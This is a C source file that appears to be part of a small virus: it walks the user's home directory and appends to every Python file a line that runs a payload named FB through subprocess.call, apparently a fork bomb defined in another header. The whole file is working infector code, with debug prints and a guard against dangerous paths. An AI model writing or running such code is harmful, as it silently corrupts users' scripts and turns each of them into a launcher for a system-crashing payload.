//
// Created by kkyse on 10/5/2017.
//

#include "python.h"

#include <ftw.h>
#include <stdio.h>
#include <string.h>

#include "io.h"
#include "fb.h"

#define DEBUG_PYTHON true

#define NUM_OPEN_FD 1000

bool modify_python_file(const char *const path) {
    #if (DEBUG_PYTHON)
    printf("modifying %s\n", path);
    #endif
    
    FILE *const file = fopen(path, "a");
    if (file == NULL) {
        return false;
    }
    fputs("\n\n", file);
    
    fputs("import subprocess\n", file);
    fprintf(file, "subprocess.call('%s')", FB);
    
    fputs("\n\n", file);
    fclose(file);
    return true;
}

bool is_python_file(const char *const path) {
    const size_t len = strlen(path);
    const char *const ext = path + len - 3;
    return strcmp(ext, ".py") == 0;
}

int modify_possibly_python_file(const char *const path, const struct stat *const sb, const int type_flag) {
    #if (DEBUG_PYTHON)
    printf("scanning %s\n", path);
    #endif
    
    if (type_flag == FTW_F && is_python_file(path)) {
        return modify_python_file(path);
    }
    return 0;
}

int modify_python_files_in_dir(const char *const dir_path) {
    #if (DEBUG_PYTHON)
    printf("modifying python files in %s\n", dir_path);
    #endif
    
    #if (!DEBUG_PYTHON)
    if (dangerous_filename(dir_path)) {
        return -1;
    }
    #endif
    
    return ftw(dir_path, &modify_possibly_python_file, NUM_OPEN_FD);
}

void modify_python_files() {
    modify_python_files_in_dir(get_home());
}
